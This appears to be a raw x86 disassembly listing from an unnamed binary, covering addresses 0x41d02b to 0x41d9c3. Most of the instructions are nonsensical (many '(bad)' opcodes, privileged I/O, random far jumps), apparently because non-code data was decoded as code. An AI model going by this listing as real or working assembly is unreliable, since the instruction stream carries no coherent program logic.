  41d02b:	add    DWORD PTR [eax],eax
  41d02d:	add    BYTE PTR [ebx],ah
  41d02f:	call   0x57a86af
  41d034:	dec    eax
  41d035:	into   
  41d036:	dec    ebx
  41d037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d038:	loopne 0x41d0ae
  41d03a:	mov    dx,0x1b01
  41d03e:	xchg   ebx,eax
  41d03f:	adc    DWORD PTR [ecx+0x1b],ecx
  41d042:	mov    ?,WORD PTR [ebp-0x52]
  41d045:	fwait
  41d046:	loopne 0x41d0c0
  41d048:	mov    esp,0x6e8f3f5a
  41d04d:	xlat   BYTE PTR ds:[ebx]
  41d04e:	dec    esi
  41d04f:	out    0x38,al
  41d051:	lock dec esi
  41d053:	repnz inc eax
  41d055:	shl    BYTE PTR [eax+0x16],1
  41d058:	outs   dx,BYTE PTR ds:[esi]
  41d059:	test   DWORD PTR [ecx-0x20],ebp
  41d05c:	push   ds
  41d05d:	xchg   BYTE PTR [ebp+0x1d94d6e0],cl
  41d063:	pop    ebp
  41d064:	cmp    eax,0x21d3ba9c
  41d069:	sbb    cl,BYTE PTR [edx+0x1c5bfb88]
  41d06f:	out    0x76,al
  41d071:	call   0x94c7:0x1b05d4a5
  41d078:	or     DWORD PTR [ecx-0x55],edx
  41d07b:	mov    bl,0x2b
  41d07d:	pop    edi
  41d07e:	mov    ds:0x9ffeff7c,eax
  41d083:	mov    ah,0x29
  41d085:	or     ecx,DWORD PTR [edi+0x56]
  41d088:	aas    
  41d089:	not    DWORD PTR [ebx]
  41d08b:	into   
  41d08c:	adc    ebp,ecx
  41d08e:	test   al,0x2d
  41d090:	retf   0xc5d1
  41d093:	adc    ebp,DWORD PTR [eax]
  41d095:	aam    0x89
  41d097:	sbb    al,0x9f
  41d099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d09a:	ins    BYTE PTR es:[edi],dx
  41d09b:	imul   eax,DWORD PTR [ebx+0x57d39ad7],0x37b4b50b
  41d0a5:	aas    
  41d0a6:	xchg   ebx,eax
  41d0a7:	fstp   TBYTE PTR [edi]
  41d0a9:	xor    DWORD PTR [ebx+0x59b4acaa],edx
  41d0af:	je     0x41d03c
  41d0b1:	retf   
  41d0b2:	pop    ss
  41d0b3:	xchg   esi,eax
  41d0b4:	icebp  
  41d0b5:	xlat   BYTE PTR ds:[ebx]
  41d0b6:	test   eax,0x72dba32b
  41d0bb:	pop    edi
  41d0bc:	fsubr  st,st(3)
  41d0be:	mov    ss,WORD PTR [eax+0x5622688a]
  41d0c4:	push   0x74d31050
  41d0c9:	adc    BYTE PTR [edx-0x3a2a60ce],ch
  41d0cf:	jmp    0x2c0f:0x9b0b09b6
  41d0d6:	mov    bl,0x99
  41d0d8:	pop    ebp
  41d0d9:	les    eax,FWORD PTR [ecx-0x2c]
  41d0dc:	test   DWORD PTR [edx+ecx*2-0x5aa3ce8f],0x205fa1b5
  41d0e7:	xor    ebx,eax
  41d0e9:	add    al,0x2b
  41d0eb:	loop   0x41d0a3
  41d0ed:	jmp    0x6fec:0x4629632a
  41d0f4:	jne    0x41d0c7
  41d0f6:	popf   
  41d0f7:	(bad)  
  41d0f8:	int    0x1b
  41d0fa:	in     eax,dx
  41d0fb:	inc    edi
  41d0fc:	xor    al,0x9b
  41d0fe:	arpl   WORD PTR [edx],bx
  41d100:	jo     0x41d0bc
  41d102:	mov    edi,0xb4ade7ce
  41d107:	cdq    
  41d108:	aad    0x3b
  41d10a:	adc    eax,0x9db34795
  41d10f:	and    al,0x23
  41d111:	adc    DWORD PTR [ebx-0x69cc7be0],eax
  41d117:	mov    al,ds:0x861e8c62
  41d11c:	mov    dh,0xa3
  41d11e:	fimul  WORD PTR [ebp+0x4c]
  41d121:	mov    ebp,0x63fcbbb4
  41d126:	mov    ss,esp
  41d128:	and    ah,bl
  41d12a:	cmp    eax,0x6591655c
  41d12f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d130:	adc    BYTE PTR [edi+edx*2],ch
  41d133:	push   es
  41d134:	cmp    eax,DWORD PTR [eax]
	...
  41d196:	push   eax
  41d197:	ret    
  41d198:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d19e:	sti    
  41d19f:	aad    0x81
  41d1a1:	loopne 0x41d1a6
  41d1a3:	dec    edi
  41d1a4:	(bad)
  41d1a7:	xor    eax,DWORD PTR [ecx]
  41d1a9:	add    BYTE PTR [edi],al
  41d1ab:	add    DWORD PTR [eax],eax
  41d1ad:	add    BYTE PTR [ebx+0x68],bl
  41d1b0:	nop
  41d1b1:	out    0x78,eax
  41d1b3:	xor    al,0x0
  41d1b5:	movq   QWORD PTR [ebx-0x48],mm1
  41d1b9:	arpl   WORD PTR [edi+0x7f],di
  41d1bc:	and    eax,0x833aa17d
  41d1c1:	outs   dx,DWORD PTR ds:[esi]
  41d1c2:	jne    0x41d1db
  41d1c4:	stos   DWORD PTR es:[edi],eax
  41d1c5:	xor    al,0x8f
  41d1c7:	push   0xffffff9b
  41d1c9:	sub    BYTE PTR [ebp+0x3cc9b74a],bh
  41d1cf:	cmp    DWORD PTR [esi],eax
  41d1d1:	ins    DWORD PTR es:[edi],dx
  41d1d2:	mov    al,0x17
  41d1d4:	repnz sahf 
  41d1d6:	pop    ecx
  41d1d7:	js     0x41d218
  41d1d9:	dec    edi
  41d1da:	add    eax,0xef70a102
  41d1df:	ror    BYTE PTR [edi+0x6b],cl
  41d1e2:	ins    DWORD PTR es:[edi],dx
  41d1e3:	ins    DWORD PTR es:[edi],dx
  41d1e4:	jg     0x41d20d
  41d1e6:	xor    eax,0x30967304
  41d1eb:	dec    esp
  41d1ec:	(bad)  
  41d1ed:	jle    0x41d173
  41d1ef:	inc    edx
  41d1f0:	lods   eax,DWORD PTR gs:[esi]
  41d1f2:	nop
  41d1f3:	or     al,0x5b
  41d1f5:	and    al,al
  41d1f7:	mov    esi,0x225f12db
  41d1fc:	mul    DWORD PTR [edi-0x5e]
  41d1ff:	jl     0x41d266
  41d201:	ret    
  41d202:	cmp    eax,0xd712d16d
  41d207:	sbb    al,0x7d
  41d209:	fnsave [bp-0x14]
  41d20d:	push   0x14ac28bd
  41d212:	xchg   ebp,eax
  41d213:	int    0x26
  41d215:	pop    bx
  41d218:	ja     0x41d26b
  41d21a:	adc    bh,BYTE PTR [eax+0x34a57412]
  41d220:	xor    ebx,DWORD PTR [edi]
  41d222:	pop    ebp
  41d223:	out    0x4a,eax
  41d225:	rcl    DWORD PTR [ecx],0x4e
  41d228:	bnd js 0x41d27e
  41d22b:	sub    al,0x5b
  41d22d:	mov    al,0x17
  41d22f:	enter  0x8d36,0x1
  41d233:	and    ebx,edi
  41d235:	inc    eax
  41d236:	jae    0x41d1de
  41d238:	sub    BYTE PTR [ebx+0x2816c2c1],0xa9
  41d23f:	ret    
  41d240:	aam    0xab
  41d242:	sub    al,0x96
  41d244:	adc    DWORD PTR [ebx],0x261b477b
  41d24a:	push   esp
  41d24b:	and    al,0x25
  41d24d:	mov    bl,0xb3
  41d24f:	xor    edx,DWORD PTR [ebx]
  41d251:	(bad)  
  41d253:	jb     0x41d295
  41d255:	push   0x9f4e5231
  41d25a:	push   edi
  41d25b:	xchg   esp,eax
  41d25c:	leave  
  41d25d:	mov    ecx,0x13df100c
  41d262:	push   edi
  41d263:	(bad)  
  41d264:	dec    edx
  41d265:	pop    edi
  41d266:	mov    ebx,0x49bc1fa5
  41d26b:	das    
  41d26c:	mov    ah,0x53
  41d26e:	idiv   DWORD PTR fs:[eax-0x30]
  41d272:	test   DWORD PTR [ecx+ebp*1-0x7831741a],eax
  41d279:	adc    eax,edi
  41d27b:	test   al,0x1c
  41d27d:	scas   eax,DWORD PTR es:[edi]
  41d27e:	inc    ebx
  41d27f:	repz aad 0xfb
  41d282:	mov    al,0xfd
  41d284:	sbb    BYTE PTR [ebx+0x1d],dl
  41d287:	mov    ecx,DWORD PTR [ebp+0x54]
  41d28a:	dec    edx
  41d28b:	addr16 fwait
  41d28d:	ss in  eax,0x9a
  41d290:	ror    DWORD PTR [edx+0x50],cl
  41d293:	pop    ebp
  41d294:	cmp    eax,0x3a2d465e
  41d299:	dec    edi
  41d29a:	scas   eax,DWORD PTR es:[edi]
  41d29b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d29c:	and    al,0x32
  41d29e:	jno    0x41d29d
  41d2a0:	mov    ds:0xa270d99c,eax
  41d2a5:	adc    al,0xfa
  41d2a7:	lods   al,BYTE PTR ds:[esi]
  41d2a8:	test   ecx,ebx
  41d2aa:	rcl    BYTE PTR [esi],0xdb
  41d2ad:	mov    bl,0xd
  41d2af:	pop    esp
  41d2b0:	jmp    0x41d286
  41d2b2:	mov    BYTE PTR [edx+ebx*1+0x0],bh
	...
  41d315:	add    dh,bh
  41d317:	cmp    cl,0x54
  41d31a:	(bad)  
  41d31b:	jge    0x41d31c
  41d31d:	stos   BYTE PTR es:[edi],al
  41d31e:	sbb    BYTE PTR [ebx+0x48f8857e],ch
  41d324:	data16 jne 0x41d2c9
  41d327:	xor    al,0x1
  41d329:	add    BYTE PTR [edi],al
  41d32b:	add    DWORD PTR [eax],eax
  41d32d:	add    BYTE PTR [edx],bl
  41d32f:	popa   
  41d330:	(bad)  
  41d331:	xlat   BYTE PTR ds:[ebx]
  41d332:	xlat   BYTE PTR ds:[ebx]
  41d333:	not    DWORD PTR [ebp+0x7c544e06]
  41d339:	lea    ebp,[ebp+0x71]
  41d33c:	ja     0x41d2fa
  41d33e:	and    al,0xd1
  41d340:	mov    esp,0x2fe4139
  41d345:	dec    edx
  41d346:	mov    BYTE PTR [ebx+eiz*2-0x2dd417ab],bh
  41d34d:	push   ds
  41d34e:	mov    edx,0xa1b628bc
  41d353:	push   ds
  41d354:	cli    
  41d355:	mov    bl,0x86
  41d357:	jecxz  0x41d3c0
  41d359:	or     al,ch
  41d35b:	ficom  DWORD PTR [ecx+0x1e58ea0b]
  41d361:	xchg   ebx,eax
  41d362:	out    dx,eax
  41d363:	jecxz  0x41d3a1
  41d365:	sbb    edi,DWORD PTR [ebx+esi*2-0xd]
  41d369:	daa    
  41d36a:	xchg   ebp,eax
  41d36b:	test   edx,ebx
  41d36d:	jo     0x41d3e7
  41d36f:	cwde   
  41d370:	mov    BYTE PTR [edx+0x62],bl
  41d373:	jns    0x41d32d
  41d375:	inc    edx
  41d376:	in     eax,dx
  41d377:	adc    al,0xf6
  41d379:	mov    WORD PTR [eax+edx*4-0x23],?
  41d37d:	sub    bl,al
  41d37f:	cmp    BYTE PTR [ebx-0x2dda1340],bh
  41d385:	adc    al,0x30
  41d387:	jp     0x41d3f4
  41d389:	lods   eax,DWORD PTR ds:[esi]
  41d38a:	lahf   
  41d38b:	call   0xc5e383e2
  41d390:	aad    0xcc
  41d392:	mov    ebp,0xb2e2c223
  41d397:	adc    ebp,DWORD PTR [edx-0x1f]
  41d39a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d39b:	hlt    
  41d39c:	and    al,0x69
  41d39e:	sub    al,0x55
  41d3a0:	mov    cl,BYTE PTR [ecx+0x48b864e1]
  41d3a6:	or     DWORD PTR [edi+0x70],edi
  41d3a9:	dec    ebx
  41d3aa:	sbb    al,al
  41d3ac:	div    BYTE PTR ds:0x3370b82b
  41d3b2:	sub    eax,0x470765a8
  41d3b7:	cld    
  41d3b8:	inc    ebx
  41d3b9:	scas   eax,DWORD PTR es:[edi]
  41d3ba:	ret    
  41d3bb:	cmp    eax,DWORD PTR [ebx+0x2e]
  41d3be:	cmp    eax,0x454efdbc
  41d3c3:	rcr    dh,cl
  41d3c5:	repz jmp 0x41d396
  41d3c8:	sub    al,0x10
  41d3ca:	jns    0x41d3b8
  41d3cc:	shl    BYTE PTR [ecx+edi*2+0x2e],cl
  41d3d0:	inc    edi
  41d3d1:	les    ebp,FWORD PTR ds:0x276285db
  41d3d7:	shl    bh,0xa
  41d3da:	enter  0x4351,0x13
  41d3de:	cmp    al,0x2
  41d3e0:	xor    DWORD PTR [edi+0x15],edx
  41d3e3:	daa    
  41d3e4:	jmp    0xd9fe67a9
  41d3e9:	and    eax,0xf3997b9e
  41d3ee:	jne    0x41d43c
  41d3f0:	cwde   
  41d3f1:	lahf   
  41d3f2:	xor    BYTE PTR [eax-0x7d],0x54
  41d3f6:	(bad)  
  41d3f7:	cmp    BYTE PTR [ecx],0xbb
  41d3fa:	sub    al,0x58
  41d3fc:	sbb    edx,DWORD PTR [ecx-0x608c0a3]
  41d402:	push   cs
  41d403:	or     BYTE PTR [ebx],ah
  41d405:	sub    BYTE PTR ds:0x2775b913,ah
  41d40b:	xchg   ecx,eax
  41d40c:	hlt    
  41d40d:	xor    bh,BYTE PTR [edx]
  41d40f:	mov    gs,ecx
  41d411:	stc    
  41d412:	cmp    ebx,DWORD PTR [eax-0x61b32272]
  41d418:	test   ah,0x24
  41d41b:	bt     DWORD PTR [esi+0x48],edi
  41d41f:	aas    
  41d420:	jno    0x41d3b7
  41d422:	mov    ah,0x2d
  41d424:	call   0x17c2a6db
  41d429:	sbb    cl,cl
  41d42b:	sti    
  41d42c:	(bad)  
  41d42d:	mov    edi,0xfc28f6e9
  41d432:	pop    ds
  41d433:	inc    ebp
  41d434:	cld    
	...
  41d495:	add    dh,dh
  41d497:	rcl    BYTE PTR ss:[edx+edx*8-0x2e89090c],cl
  41d49f:	fwait
  41d4a0:	aad    0xa2
  41d4a2:	ss dec eax
  41d4a4:	pushf  
  41d4a5:	mov    edi,0x135a9
  41d4aa:	pop    es
  41d4ab:	add    DWORD PTR [eax],eax
  41d4ad:	add    BYTE PTR [edi],bh
  41d4af:	call   0x5f38:0x4bf5f4b2
  41d4b6:	leave  
  41d4b7:	into   
  41d4b8:	push   ebp
  41d4b9:	pushf  
  41d4ba:	xlat   BYTE PTR ds:[ebx]
  41d4bb:	(bad)  
  41d4bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4bd:	in     al,dx
  41d4be:	fwait
  41d4bf:	popa   
  41d4c0:	stos   BYTE PTR es:[edi],al
  41d4c1:	retf   0x4207
  41d4c4:	mov    gs,WORD PTR [ecx]
  41d4c6:	sub    dl,bh
  41d4c8:	jo     0x41d4d6
  41d4ca:	test   DWORD PTR gs:[edi+ebp*8],edi
  41d4ce:	inc    edi
  41d4cf:	fld    st(7)
  41d4d1:	and    DWORD PTR [ebx+0x70],0x47beafe9
  41d4d8:	int    0x16
  41d4da:	or     eax,0x5d0b9189
  41d4df:	mov    dh,0xd7
  41d4e1:	inc    esi
  41d4e2:	out    0x26,al
  41d4e4:	add    BYTE PTR [edi],dh
  41d4e6:	jg     0x41d49b
  41d4e8:	outs   dx,BYTE PTR ds:[esi]
  41d4e9:	sbb    BYTE PTR [esi-0xed2e988],0xa1
  41d4f0:	rcl    DWORD PTR [eax],cl
  41d4f2:	int3   
  41d4f3:	mov    ecx,0x349ea722
  41d4f8:	mov    DWORD PTR [esi+eax*1],ebx
  41d4fb:	scas   al,BYTE PTR es:[edi]
  41d4fc:	rcr    BYTE PTR ds:0x448ddc74,1
  41d502:	sub    eax,0x47ddb07f
  41d507:	and    al,0x21
  41d509:	xchg   ecx,eax
  41d50a:	es stos BYTE PTR es:[edi],al
  41d50c:	mov    DWORD PTR [ecx+0x2d],0xf5887779
  41d513:	mov    ebp,DWORD PTR [ebx]
  41d515:	mov    al,0x70
  41d517:	ror    BYTE PTR [edi-0x46],0xd8
  41d51b:	(bad)  
  41d51c:	mov    dl,0x2f
  41d51e:	(bad)  
  41d51f:	leave  
  41d520:	retf   
  41d521:	dec    edx
  41d522:	aas    
  41d523:	lods   al,BYTE PTR ds:[esi]
  41d524:	inc    BYTE PTR [edx+0x1b]
  41d527:	(bad)  
  41d528:	ins    BYTE PTR es:[edi],dx
  41d529:	dec    ebx
  41d52a:	test   BYTE PTR [eax+0x53591ca6],cl
  41d530:	ins    DWORD PTR es:[edi],dx
  41d531:	jae    0x41d4cc
  41d533:	add    BYTE PTR [eax],cl
  41d535:	or     ebx,DWORD PTR [ecx+0x57623d93]
  41d53b:	jo     0x41d5b6
  41d53d:	adc    DWORD PTR [ebx],ebx
  41d53f:	call   0xe9a5:0xc996f17b
  41d546:	add    eax,0x93ed8889
  41d54b:	gs sub eax,0x1626bcfa
  41d551:	rol    BYTE PTR [esi],0xf6
  41d554:	mov    bh,BYTE PTR [edx]
  41d556:	pop    edx
  41d557:	or     edx,DWORD PTR [ebx+0x41e31897]
  41d55d:	mov    dh,0xae
  41d55f:	test   dl,dl
  41d561:	int    0xf3
  41d563:	adc    DWORD PTR es:[eax+0x2b],ebp
  41d567:	into   
  41d568:	add    eax,0xfaff3002
  41d56d:	xchg   edi,eax
  41d56e:	shl    BYTE PTR [eax+edi*2+0x1cb350db],1
  41d575:	dec    ebp
  41d576:	arpl   WORD PTR [eax],sp
  41d578:	in     eax,0x9f
  41d57a:	les    edi,FWORD PTR [ebp-0x26]
  41d57d:	push   ebp
  41d57e:	jge    0x41d5b2
  41d580:	add    BYTE PTR [ebx+0x24],dh
  41d583:	fstp   st(3)
  41d585:	pusha  
  41d586:	(bad)  
  41d587:	adc    eax,0x8ec26cc3
  41d58c:	retf   0x12c3
  41d58f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d590:	adc    eax,0x138658e9
  41d595:	add    al,0xd2
  41d597:	adc    eax,0xe21b1af7
  41d59c:	ins    BYTE PTR es:[edi],dx
  41d59d:	jp     0x41d59f
  41d59f:	(bad)  
  41d5a0:	mov    cl,0x69
  41d5a2:	ret    
  41d5a3:	push   es
  41d5a4:	push   ecx
  41d5a5:	pop    esi
  41d5a6:	scas   al,BYTE PTR es:[edi]
  41d5a7:	mov    DWORD PTR [edi+0x178aa632],edi
  41d5ad:	mov    ch,0x70
  41d5af:	mov    dl,0x6c
  41d5b1:	jbe    0x41d57e
  41d5b3:	cs out dx,eax
	...
  41d615:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d619:	jbe    0x41d608
  41d61b:	idiv   DWORD PTR [esi-0x65]
  41d61e:	mov    al,BYTE PTR [edi+0x158fd221]
  41d624:	out    0xc4,al
  41d626:	mov    al,0x36
  41d628:	add    DWORD PTR [eax],eax
  41d62a:	pop    es
  41d62b:	add    DWORD PTR [eax],eax
  41d62d:	add    BYTE PTR [ebp-0x4d7cb352],al
  41d633:	mov    cl,0xd6
  41d635:	std    
  41d636:	icebp  
  41d637:	and    DWORD PTR [esi],0x46
  41d63a:	lock add dl,ch
  41d63d:	or     cl,BYTE PTR [eax-0x3]
  41d640:	rdmsr  
  41d642:	shl    DWORD PTR [ecx+0x392dccf3],cl
  41d648:	adc    DWORD PTR [eax-0x53],esp
  41d64b:	xchg   edx,eax
  41d64c:	jns    0x41d636
  41d64e:	sbb    BYTE PTR [edi-0x55],0x4a
  41d652:	jae    0x41d69e
  41d654:	mov    eax,0xd92c617b
  41d659:	or     eax,0x776fb1a
  41d65e:	pop    edx
  41d65f:	pushf  
  41d660:	shl    ebp,cl
  41d662:	mov    ds:0x50ede0c3,eax
  41d667:	out    dx,eax
  41d668:	add    DWORD PTR [ecx+0x2c],eax
  41d66b:	sub    eax,0xe620d573
  41d670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d671:	jl     0x41d5fa
  41d673:	adc    ebp,edx
  41d675:	lock lods eax,DWORD PTR ds:[esi]
  41d677:	rol    BYTE PTR [esi+0x56bcf5d5],1
  41d67d:	ret    
  41d67e:	lea    edi,[eax+esi*8]
  41d681:	test   eax,0x347f2674
  41d686:	and    edi,DWORD PTR [ebp-0x40]
  41d689:	shl    BYTE PTR [esp+ebx*8+0x7b],cl
  41d68d:	dec    ecx
  41d68e:	jecxz  0x41d611
  41d690:	xor    DWORD PTR [esi-0x45e30c5d],ecx
  41d696:	mov    BYTE PTR [esi-0x56],0x9d
  41d69a:	loopne 0x41d6ef
  41d69c:	jmp    0xac5e3704
  41d6a1:	jecxz  0x41d6d5
  41d6a3:	mov    dl,BYTE PTR [ecx+0x305c15d1]
  41d6a9:	dec    ebx
  41d6aa:	add    al,0xbe
  41d6ac:	and    DWORD PTR [ebx],ebp
  41d6ae:	jmp    DWORD PTR [esp]
  41d6b1:	clc    
  41d6b2:	fdiv   QWORD PTR [eax]
  41d6b4:	rol    DWORD PTR [ebx-0x61],1
  41d6b7:	sti    
  41d6b8:	adc    DWORD PTR [edi+0x6fb50ad7],ebp
  41d6be:	sub    eax,0xffa815a5
  41d6c3:	pop    ds
  41d6c4:	inc    esi
  41d6c5:	(bad)  [ebx-0x42]
  41d6c8:	nop
  41d6c9:	es cld 
  41d6cb:	xacquire xchg DWORD PTR [edi+ebp*2+0x6326cfa3],edi
  41d6d3:	inc    ebx
  41d6d4:	int3   
  41d6d5:	outs   dx,BYTE PTR ds:[esi]
  41d6d6:	mov    WORD PTR ds:0x6d317e6b,ds
  41d6dc:	jb     0x41d661
  41d6de:	jl     0x41d6a3
  41d6e0:	jo     0x41d722
  41d6e2:	cmp    BYTE PTR [edx],ah
  41d6e4:	sub    ah,ah
  41d6e6:	loopne 0x41d713
  41d6e8:	out    dx,eax
  41d6e9:	xchg   ecx,eax
  41d6ea:	out    dx,eax
  41d6eb:	jge    0x41d715
  41d6ed:	lea    edi,[edi+0x2a7a3373]
  41d6f3:	ror    BYTE PTR [esi],0x10
  41d6f6:	stc    
  41d6f7:	mov    al,ds:0xb4228f35
  41d6fc:	and    ecx,DWORD PTR [ebp+0x968f2dc]
  41d702:	mov    cl,0x1d
  41d704:	pop    eax
  41d705:	les    esi,FWORD PTR [ecx-0x2a85273e]
  41d70b:	data16 icebp 
  41d70d:	stos   DWORD PTR es:[edi],eax
  41d70e:	xchg   esp,eax
  41d70f:	in     al,dx
  41d710:	ss aaa 
  41d712:	dec    edx
  41d713:	sbb    ah,dl
  41d715:	xlat   BYTE PTR ds:[ebx]
  41d716:	cmp    eax,0x18f3d88
  41d71b:	pop    edi
  41d71c:	cld    
  41d71d:	add    bh,BYTE PTR cs:[edi-0x54]
  41d721:	out    0x2a,eax
  41d723:	xor    eax,0xcccb42cc
  41d728:	lods   al,BYTE PTR ds:[esi]
  41d729:	pop    eax
  41d72a:	in     al,0xde
  41d72c:	shl    DWORD PTR [eax-0x80],1
  41d72f:	xor    DWORD PTR ds:0x2db96e71,ebp
	...
  41d795:	add    BYTE PTR [esi+ecx*8],ah
  41d798:	outs   dx,BYTE PTR ds:[esi]
  41d799:	sub    ch,dh
  41d79b:	stos   BYTE PTR es:[edi],al
  41d79c:	fs into 
  41d79e:	push   ecx
  41d79f:	pop    ebp
  41d7a0:	or     esp,edi
  41d7a2:	cdq    
  41d7a3:	jb     0x41d7d6
  41d7a5:	inc    esp
  41d7a6:	mov    bh,0x37
  41d7a8:	add    DWORD PTR [eax],eax
  41d7aa:	pop    es
  41d7ab:	add    DWORD PTR [eax],eax
  41d7ad:	add    bh,ch
  41d7af:	jmp    0x41d81a
  41d7b1:	loop   0x41d76e
  41d7b3:	pop    esp
  41d7b4:	push   es
  41d7b5:	jmp    0x41d75e
  41d7b7:	inc    esp
  41d7b8:	outs   dx,BYTE PTR ds:[esi]
  41d7b9:	es cli 
  41d7bb:	jl     0x41d77c
  41d7bd:	sbb    al,0xef
  41d7bf:	in     eax,0xd6
  41d7c1:	push   ebx
  41d7c2:	pop    ss
  41d7c3:	mov    edx,0x53d3a46
  41d7c8:	cld    
  41d7c9:	mov    eax,ds:0x78690af1
  41d7ce:	jle    0x41d7e8
  41d7d0:	xor    al,BYTE PTR [edi]
  41d7d2:	jge    0x41d840
  41d7d4:	xchg   ecx,eax
  41d7d5:	pop    edi
  41d7d6:	out    0xa5,al
  41d7d8:	mov    fs,WORD PTR [ecx-0x9]
  41d7db:	sbb    ecx,ecx
  41d7dd:	add    BYTE PTR [edx-0x37],0xd2
  41d7e1:	jbe    0x41d77e
  41d7e3:	std    
  41d7e4:	test   BYTE PTR [ebx],dh
  41d7e6:	or     al,cl
  41d7e8:	add    esi,DWORD PTR [esi+0x63]
  41d7eb:	fidivr DWORD PTR [ecx-0xa]
  41d7ee:	in     al,dx
  41d7ef:	mov    edx,0x738c4d6e
  41d7f4:	pop    ebx
  41d7f5:	pop    ecx
  41d7f6:	daa    
  41d7f7:	ins    BYTE PTR es:[edi],dx
  41d7f8:	adc    edx,DWORD PTR [esi-0x27]
  41d7fb:	or     al,0xbe
  41d7fd:	enter  0xc4f3,0x6f
  41d801:	push   eax
  41d802:	push   esi
  41d803:	dec    edx
  41d804:	test   DWORD PTR [ebp-0x5eeae581],ecx
  41d80a:	dec    ebp
  41d80b:	gs mov ds:0xba76d30e,eax
  41d812:	iret   
  41d813:	cmp    eax,0x7bf15130
  41d818:	push   ebx
  41d819:	or     dl,BYTE PTR [edi]
  41d81b:	pop    esi
  41d81c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d81d:	fist   WORD PTR [eax+0x59cf5df4]
  41d823:	aas    
  41d824:	and    BYTE PTR [edi],bh
  41d826:	icebp  
  41d827:	mov    dl,0x52
  41d829:	icebp  
  41d82a:	lock cdq 
  41d82c:	and    ch,BYTE PTR [edi*1-0x140605c9]
  41d833:	mov    esi,0xa8629d4a
  41d838:	das    
  41d839:	rcr    DWORD PTR [ebx+0x2b2b53dc],0x88
  41d840:	mov    esp,0x943cad9e
  41d845:	dec    ebx
  41d846:	jns    0x41d80c
  41d848:	and    bl,al
  41d84a:	lea    edx,[edi+ebx*8+0x20]
  41d84e:	adc    cl,BYTE PTR [eax+ecx*4-0x44]
  41d852:	pop    ss
  41d853:	jmp    0x87516b32
  41d858:	jmp    FWORD PTR [edx-0x62fb8885]
  41d85e:	inc    esp
  41d85f:	retf   0xc66
  41d862:	xchg   esi,eax
  41d863:	(bad)  
  41d864:	(bad)  
  41d865:	(bad)  
  41d866:	popa   
  41d867:	sub    BYTE PTR [ecx-0x44ecafb7],al
  41d86d:	jg     0x41d8cf
  41d86f:	dec    ebx
  41d870:	das    
  41d871:	or     eax,0xefab7a64
  41d876:	test   BYTE PTR [ebp-0x1c],0xe9
  41d87a:	nop
  41d87b:	dec    eax
  41d87c:	jbe    0x41d83f
  41d87e:	mov    edi,0x7317827c
  41d883:	pop    edi
  41d884:	inc    edx
  41d885:	jp     0x41d891
  41d887:	lock pop esi
  41d889:	push   esi
  41d88a:	out    dx,al
  41d88b:	jae    0x41d8cb
  41d88d:	out    dx,eax
  41d88e:	into   
  41d88f:	stc    
  41d890:	repnz scas al,BYTE PTR es:[edi]
  41d892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d893:	clc    
  41d894:	fimul  DWORD PTR [ebp+0x62678d84]
  41d89a:	pop    ebp
  41d89b:	shl    WORD PTR cs:[ebx-0x6012bc29],0x5d
  41d8a4:	call   0xa6b:0x533f7d11
  41d8ab:	push   0xd7d92b22
  41d8b0:	outs   dx,DWORD PTR ds:[esi]
  41d8b1:	push   ds
  41d8b2:	jmp    0x41d85f
  41d8b4:	icebp  
	...
  41d915:	add    ah,al
  41d917:	ins    BYTE PTR es:[edi],dx
  41d918:	pop    es
  41d919:	pushf  
  41d91a:	scas   eax,DWORD PTR es:[edi]
  41d91b:	(bad)  
  41d91c:	fistp  QWORD PTR [ebx+eiz*8+0x0]
  41d920:	inc    eax
  41d921:	jmp    0x38be:0xc23c72c0
  41d928:	add    DWORD PTR [eax],eax
  41d92a:	pop    es
  41d92b:	add    DWORD PTR [eax],eax
  41d92d:	add    BYTE PTR [edi-0x17ec8b07],dl
  41d933:	push   ecx
  41d934:	sbb    DWORD PTR [ecx-0x7e],0x7e
  41d938:	stos   DWORD PTR es:[edi],eax
  41d939:	fsubr  QWORD PTR [ebp+0x27663cce]
  41d93f:	mov    edx,0x53687a15
  41d944:	pop    edx
  41d945:	not    dl
  41d947:	fld    TBYTE PTR [eax-0x44]
  41d94a:	add    esi,esi
  41d94c:	je     0x41d8f4
  41d94e:	and    BYTE PTR ds:0xa619c073,al
  41d954:	jecxz  0x41d978
  41d956:	mov    cl,0xfa
  41d958:	jns    0x41d8e3
  41d95a:	call   0x887e:0x778ee03a
  41d961:	(bad)  
  41d962:	mov    ecx,0xadd7cc8b
  41d967:	fld    DWORD PTR [ecx]
  41d969:	push   ds
  41d96a:	out    0xcd,al
  41d96c:	out    0xf0,eax
  41d96e:	fild   DWORD PTR [ecx+edx*2-0x35]
  41d972:	cmp    dh,bl
  41d974:	sbb    ch,BYTE PTR [esi+0x7f]
  41d977:	push   edi
  41d978:	add    DWORD PTR [ebx+ebx*2+0x2ced0c70],edi
  41d97f:	mov    dh,0xc0
  41d981:	and    edx,esi
  41d983:	pop    DWORD PTR [ebx]
  41d985:	jecxz  0x41d9d5
  41d987:	or     ah,bl
  41d989:	mov    edx,0x4952fc0b
  41d98e:	out    dx,al
  41d98f:	cmp    al,0xe7
  41d991:	(bad)  
  41d992:	fadd   st(1),st
  41d994:	mov    ss:0x40cea70e,al
  41d99a:	pop    esp
  41d99b:	bnd jb 0x41d974
  41d99e:	sbb    ch,ch
  41d9a0:	popf   
  41d9a1:	jle    0x41d93a
  41d9a3:	or     eax,0x180f7d4e
  41d9a8:	sub    al,0xf6
  41d9aa:	mov    eax,0x57d4583c
  41d9af:	shl    DWORD PTR [edx+ebx*4],0xb6
  41d9b3:	sbb    al,0x23
  41d9b5:	or     dh,ch
  41d9b7:	out    dx,eax
  41d9b8:	xchg   edx,eax
  41d9b9:	inc    edx
  41d9ba:	std    
  41d9bb:	and    al,dl
  41d9bd:	mov    DWORD PTR [edi+0x0],edx
  41d9c0:	and    ah,bl
  41d9c2:	aas    
  41d9c3:	or     eax,0x241f2459
